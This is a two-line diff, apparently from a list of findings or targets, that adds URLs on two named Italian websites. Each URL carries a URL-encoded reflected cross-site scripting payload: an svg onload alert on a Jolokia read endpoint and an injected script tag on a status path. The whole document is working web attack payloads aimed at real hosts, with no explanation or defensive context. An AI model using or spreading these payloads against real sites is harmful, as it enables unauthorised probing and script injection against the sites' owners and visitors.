@@ -1,0 +1,2 @@
+http://albertoguerra.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://arwio.it/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
